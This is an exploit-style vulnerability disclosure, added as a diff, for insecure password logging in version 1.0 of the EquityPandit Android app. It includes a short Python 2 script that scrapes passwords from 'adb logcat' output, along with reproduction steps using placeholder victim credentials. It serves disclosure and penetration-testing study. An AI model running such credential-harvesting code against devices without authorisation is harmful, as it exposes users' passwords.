@@ -1,0 +1,48 @@
+#Exploit title: EquityPandit v1.0 - Insecure Logging
+#Date:27/05/2019
+#Exploit Author: ManhNho
+#Software name: "EquityPandit"
+#Software link: https://play.google.com/store/apps/details?id=com.yieldnotion.equitypandit
+#Version: 1.0
+# Category: Android apps
+#Description:
+
+   - Sometimes developers keeps sensitive data logged into the developer
+   console. Thus, attacker easy to capture sensitive information like password.
+   - In this application, with adb, attacker can capture password of any
+   users via forgot password function.
+
+#Requirement:
+
+   - Santoku virtual machine
+   - Android virtual machine (installed "EquityPandit" apk file)
+   - Victim user/password: victim@abc.com/123456
+   - Exploit code named capture.py in Santoku vm as below:
+
+import subprocess
+import re
+
+process_handler = subprocess.Popen(['adb', 'logcat', '-d'],
+stdout=subprocess.PIPE)
+dumps = process_handler.stdout.read()
+password_list = re.findall(r'password\s(.*)', dumps)
+print 'Captured %i passwords! \nThey are:' %len(password_list)
+for index, item in enumerate(password_list):
+	print '\t#%i: %s' %(int(index)+1, item)
+
+#Reproduce:
+
+   - Step 1: From Santoku, use adb to connect to Android machine (x.x.x.x)
+
+adb connect x.x.x.x
+
+
+   - Step 2: From Android machine, open EquityPandit, click forgot password
+   function for acccount "victim@abc.com" and then click submit
+   - Step 3: From Santoku, execute capture.py
+   - Actual: Password of "victim@abc.com" will be show in terminal as
+   "123456"
+
+#Demo:
+
+https://github.com/ManhNho/Practical-Android-Penetration-Testing/blob/master/Images/Equitypandit%20PoC.wmv
